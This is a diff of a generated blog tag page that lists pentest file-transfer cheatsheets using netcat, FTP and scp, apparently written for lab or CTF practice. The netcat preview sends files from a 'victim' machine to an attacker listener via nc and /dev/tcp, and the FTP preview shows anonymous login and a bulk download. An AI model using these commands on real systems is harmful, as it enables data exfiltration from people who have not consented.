@@ -173,38 +173,7 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">📁 File Transfer Using Netcat
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>🖥️ Step 1: Start Listening on Local Machine (Kali) Run the following command to start listening for incoming files:
-nc -lp 4444 &gt; filename # waiting for receiving the files 📤 Step 2: Transfer File from Remote Machine (Victim) Run this command on the victim machine to send the file:
-nc -w 3 10.10.14.19 4444 &lt; filename # it&#39;s time to send the file OR, use this alternative method:
-cat filename &gt; /dev/tcp/10.10.14.19/4444 Note: 10.10.14.19 is the IP address of the local machine (tun0).
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 📁 File Transfer Using Netcat" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">📡 File Transfer via FTP on Linux
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 🧰 Using ftp Command 1. Connect to FTP Server Replace 10.10.10.98 with your target FTP server IP or domain:
-ftp 10.10.10.98 2. Login as Anonymous Name (10.10.10.98:yourusername): anonymous Password: (press Enter) 3. Set Binary Mode To handle all types of files properly:
-ftp&gt; binary 4. Disable Prompting (for Multiple Files) ftp&gt; prompt off Interactive mode off. 5. Download Files (Wildcard) ftp&gt; mget * ⚠️ Note: Standard ftp does not support recursive download. For recursive download, use a better client like lftp.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 📡 File Transfer via FTP on Linux" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🔐 File Transfer Over SSH Using `scp`
+    <h2 class="entry-hint-parent">File Transfer Over SSH Using `scp`
     </h2>
   </header>
   <div class="entry-content">
@@ -215,7 +184,38 @@ scp -r -P 22 u0_a418@192.168.0.20:/home/gnu ./gnu/ 📤 Uploading/Sending a File
 ...</p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🔐 File Transfer Over SSH Using `scp`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/"></a>
+  <a class="entry-link" aria-label="post link to File Transfer Over SSH Using `scp`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">File Transfer Using Netcat
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>🖥️ Step 1: Start Listening on Local Machine (Kali) Run the following command to start listening for incoming files:
+nc -lp 4444 &gt; filename # waiting for receiving the files 📤 Step 2: Transfer File from Remote Machine (Victim) Run this command on the victim machine to send the file:
+nc -w 3 10.10.14.19 4444 &lt; filename # it&#39;s time to send the file OR, use this alternative method:
+cat filename &gt; /dev/tcp/10.10.14.19/4444 Note: 10.10.14.19 is the IP address of the local machine (tun0).
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to File Transfer Using Netcat" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">File Transfer via FTP on Linux
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 🧰 Using ftp Command 1. Connect to FTP Server Replace 10.10.10.98 with your target FTP server IP or domain:
+ftp 10.10.10.98 2. Login as Anonymous Name (10.10.10.98:yourusername): anonymous Password: (press Enter) 3. Set Binary Mode To handle all types of files properly:
+ftp&gt; binary 4. Disable Prompting (for Multiple Files) ftp&gt; prompt off Interactive mode off. 5. Download Files (Wildcard) ftp&gt; mget * ⚠️ Note: Standard ftp does not support recursive download. For recursive download, use a better client like lftp.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to File Transfer via FTP on Linux" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -261,7 +261,9 @@ Step 2: Download the file using Invoke-WebRequest on Windows Open PowerShell on 
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
